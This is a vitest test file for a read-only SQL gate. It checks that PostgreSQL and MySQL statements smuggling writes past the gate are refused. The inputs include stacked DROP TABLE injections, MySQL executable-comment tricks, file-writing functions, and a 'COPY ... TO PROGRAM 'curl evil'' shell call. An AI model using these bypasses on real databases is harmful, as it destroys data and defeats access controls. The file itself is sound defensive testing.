/**
 * The statements that used to get past the read-only gate.
 *
 * Each one hid a write where the gate did not look: behind a character one engine
 * reads as a comment and the other as code, inside a MySQL comment the server
 * runs, or in a function a read-only transaction does not stop. The engine's own
 * read-only transaction is the real wall (see the drivers); these keep the gate in
 * front of it honest, so the refusal is a sentence rather than an engine error.
 */

import { describe, expect, it } from "vitest";
import { anyStatementWrites, splitStatements, statementWrites } from "./data-sql.js";

describe("PostgreSQL's grammar", () => {
    it("reads # as an operator, not a comment that hides the rest of the line", () => {
        expect(anyStatementWrites("SELECT 1 # 1; DROP TABLE users", "postgres")).toBe(true);
        expect(splitStatements("SELECT 1 # 1; DROP TABLE users", "postgres")).toEqual([
            "SELECT 1 # 1",
            "DROP TABLE users"
        ]);
    });

    it("does not let a comment marker inside a string hide the code after it", () => {
        expect(
            statementWrites("SELECT ' --', pg_terminate_backend(42)", "postgres")
        ).toBe(true);
        expect(statementWrites("SELECT '/*', pg_reload_conf(), '*/'", "postgres")).toBe(true);
    });

    it("refuses the functions a read-only transaction lets through", () => {
        for (const statement of [
            "SELECT set_config('default_transaction_read_only', 'off', false)",
            "SELECT pg_terminate_backend(123)",
            "SELECT pg_cancel_backend(123)",
            "SELECT lo_export(16409, '/tmp/out')",
            "SELECT dblink_exec('dbname=app', 'DROP TABLE users')",
            "SELECT * FROM dblink('dbname=app', 'SELECT 1') AS t(x int)",
            "SELECT nextval('users_id_seq')",
            "SELECT pg_advisory_lock(1)"
        ]) {
            expect(statementWrites(statement, "postgres"), statement).toBe(true);
        }
    });

    it("refuses COPY in every direction, including TO PROGRAM", () => {
        expect(statementWrites("COPY users TO PROGRAM 'curl evil'", "postgres")).toBe(true);
        expect(statementWrites("COPY (SELECT 1) TO '/tmp/x'", "postgres")).toBe(true);
    });

    it("refuses the ways of changing the transaction's own mode", () => {
        expect(statementWrites("SET TRANSACTION READ WRITE", "postgres")).toBe(true);
        expect(
            statementWrites("SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE", "postgres")
        ).toBe(true);
        expect(anyStatementWrites("COMMIT; DROP TABLE users", "postgres")).toBe(true);
        expect(statementWrites("BEGIN READ WRITE", "postgres")).toBe(true);
    });

    it("keeps a dollar-quoted body whole when its tag has digits in it", () => {
        const body = "SELECT $a1$ ; DROP TABLE users; $a1$";
        expect(splitStatements(body, "postgres")).toEqual([body]);
    });

    it("reads a backslash as an escape only in an E'' string", () => {
        // Standard strings: the backslash is a character, so the string ends at
        // the second quote and the DROP is a statement of its own.
        expect(splitStatements("SELECT 'a\\'; DROP TABLE users; --'", "postgres")).toEqual([
            "SELECT 'a\\'",
            "DROP TABLE users",
            "--'"
        ]);
        expect(splitStatements("SELECT E'a\\'; b'", "postgres")).toEqual(["SELECT E'a\\'; b'"]);
    });

    it("still lets the reads through", () => {
        expect(anyStatementWrites("SELECT 1 # 2; SELECT 'x -- y'", "postgres")).toBe(false);
        expect(statementWrites("/* look */ SELECT * FROM users -- all of them", "postgres")).toBe(
            false
        );
    });
});

describe("MySQL's grammar", () => {
    it("treats /*! ... */ as the code the server runs", () => {
        expect(statementWrites("/*!50000 DROP TABLE users */", "mysql")).toBe(true);
        expect(statementWrites("/*!50000 SET SESSION TRANSACTION READ WRITE */", "mysql")).toBe(
            true
        );
        expect(statementWrites("SELECT 1 /*M! , (DELETE FROM users) */", "mysql")).toBe(true);
    });

    it("reads -- as a comment only when a space follows it", () => {
        expect(statementWrites("SELECT 1--1, sleep(0)\n", "mysql")).toBe(false);
        expect(statementWrites("SELECT 1 --1\n; DROP TABLE users", "mysql")).toBe(true);
    });

    it("refuses SELECT ... INTO OUTFILE, which writes a file on the server", () => {
        expect(statementWrites("SELECT * FROM users INTO OUTFILE '/tmp/u'", "mysql")).toBe(true);
        expect(statementWrites("SELECT * FROM users INTO DUMPFILE '/tmp/u'", "mysql")).toBe(true);
    });

    it("keeps # as a comment", () => {
        expect(statementWrites("SELECT 1 # DROP TABLE users", "mysql")).toBe(false);
    });
});
